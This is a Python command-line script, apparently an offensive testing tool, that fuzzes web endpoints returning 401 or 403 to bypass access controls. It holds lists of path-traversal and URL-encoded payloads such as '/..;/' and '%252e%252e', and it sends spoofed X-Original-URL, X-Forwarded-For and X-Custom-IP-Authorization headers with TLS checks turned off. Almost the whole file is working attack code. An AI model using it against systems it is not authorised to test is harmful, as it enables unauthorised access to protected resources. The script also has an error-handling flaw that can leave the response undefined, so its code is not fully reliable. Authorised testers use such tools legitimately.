from urllib.parse import urlparse, urlunparse
import urllib, sys, argparse, requests
requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser(
    description="use this script to fuzz endpoints that return a 401/403"
)
parser.add_argument(
    '-url', '-u', action="store", default=None, dest='url',
    help="Specify the target URL")
parser.add_argument(
    '-cookies', '-c', action="store", default=None, dest='cookies',
    help="Specify cookies to use in requests. \
         eg. '-cookie \"cookie1=blah; cookie2=blah\"'")
parser.add_argument(
    '-proxy', '-p', action="store", default=None, dest='proxy',
    help="Specify a proxy to use for requests")
parser.add_argument(
    '-hc', action="store", default=None, dest='hc',
    help="Hide a specified response code from output")
parser.add_argument(
    '-hl', action="store", default=None, dest='hl',
    help="Hide a specified response length from output")
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    print()
    sys.exit()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "DNT": "1",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"}

prefix_payloads = [
    '%20', '//', '/;/', '/;//', '/./', '/.//', '/.;/', '/.;//', '/../', '/..',
    '/..//', '/..;/', '/..;//', '/../../', '/..//../', '/../..//', '//../../',
    '/../../../', '/../..//../', '/..//../../', '/../../..//', '%2f%2f',
    '%2f/', '/%2f', '/%3b/', '%2f%3b%2f', '%2f%3b%2f%2f', '/%2e/', '/%2e//',
    '/%2e%3b/', '/%2e%3b//', '/%2e%2e/', '/%2e%2e', '/%2e%2e%3b/', '/%2e%2f/',
    '/%2e%2e%2f/', '/%252e%253b/', '/%252e%252e%253b/', '%252f%252f', '%252f/',
    '/%252f', '/%252e/', '/%252e%252f/', '/%252e%252e%252f/']

suffix_payloads = [
    ';', '/', '%2f', '/./', '/%2e/', '/../', '/%2e%2e/', '.html', '.json', '#',
    '/%20', '%20']


def setup_payloads(parsed, pathPieces, query):
    urls = []
    # Set up paths with prefix payloads
    for i, piece in enumerate(pathPieces):
        for payload in prefix_payloads:
            parsed = parsed._replace(
                path=path.replace(
                    '/{}'.format(piece),  # original path
                    "{}{}".format(payload, piece)),  # add payload
                query=query)
            urls.append(urlunparse(parsed))

    # Set up paths with suffix payloads
    for i, piece in enumerate(pathPieces):
        for payload in suffix_payloads:
            parsed = parsed._replace(
                path=path.replace(
                    piece,  # original path
                    "{}{}".format(piece, payload)),  # add payload
                query=query)
            urls.append(urlunparse(parsed))

    return urls


def send_headers(url, headers, cookies, proxies, path):
    headers["X-Original-URL"] = path
    resp = requests.get(url, cookies=cookies, proxies=proxies, headers=headers, verify=False)
    print("Response code: {}   Response length: {}   Header: X-Original-URL: {}\n".format(resp.status_code, len(resp.text), headers["X-Original-URL"]))
    headers.pop("X-Original-URL")

    headers["X-Forwarded-For"] = "127.0.0.1"
    resp = requests.get(url, cookies=cookies, proxies=proxies, headers=headers, verify=False)
    print("Response code: {}   Response length: {}   Header: X-Forwarded-For: {}\n".format(resp.status_code, len(resp.text), headers["X-Forwarded-For"]))
    headers.pop("X-Forwarded-For")

    headers["X-Custom-IP-Authorization"] = "127.0.0.1"
    resp = requests.get(url, cookies=cookies, proxies=proxies, headers=headers, verify=False)
    print("Response code: {}   Response length: {}   Header: X-Custom-IP-Authorization: {}\n".format(resp.status_code, len(resp.text), headers["X-Custom-IP-Authorization"]))
    headers.pop("X-Custom-IP-Authorization")


def send_payloads(s, url, cookies, proxies, hide):
    r = requests.Request("GET", url, cookies=cookies, headers=headers)
    prep = r.prepare()
    prep.url = url
    try:
        resp = s.send(prep, verify=False)
    except requests.exceptions.ConnectionError as e:
        print(e)
        pass
    return resp.status_code, resp.text


def send_options(url, cookies, proxies):
    resp = requests.options(url, cookies=cookies, proxies=proxies, headers=headers, verify=False)
    print("Response code: {}   Response length: {}   Sent OPTIONS method. \n".format(resp.status_code, len(resp.text)))

    if len(resp.text) < 1:
        print("Response length was 0 so probably NOT worth checking out....\n")

    print("Response Headers: ")
    for h, v in resp.request.headers.items():
        print("{}: {}".format(h, v))


# if proxy, set it for requests
if args.proxy:
    try:
        proxies = {"http": args.proxy.split('//')[1],
                   "https": args.proxy.split('//')[1]
                   }
    except (IndexError, ValueError):
        print("invalid proxy specified")
        sys.exit(1)

else:
    proxies = None

# If cookies, parse them
if args.cookies:
    cookies = dict(x.strip(' ').split('=') for x in args.cookies.split(';'))
else:
    cookies = {}

hide = {}
if args.hc:
    hide["hc"] = args.hc
else:
    hide["hc"] = ''

if args.hl:
    hide["hl"] = args.hl
else:
    hide["hl"] = ''

url = args.url  # https://target.com/some/path?param1=1&param2=2
parsed = urlparse(url)
path = parsed.path  # /some/path
query = parsed.query  # param1=1param2=2
pathPieces = ' '.join(parsed.path.split('/')).split()  # ['some', 'path']
finalUrls = setup_payloads(parsed, pathPieces, query)

send_headers(url, headers, cookies, proxies, path)

s = requests.Session()
s.proxies = proxies
for url in finalUrls:
    resp_code, resp_text = send_payloads(s, url, cookies, proxies, hide)

    MSG = "Response code: {}   Response length: {}   Path: {}\n".format(resp_code, len(resp_text), path)

    if hide["hc"] != str(resp_code) and hide["hl"] != str(len(resp_text)):
        print(MSG)

send_options(url, cookies, proxies)
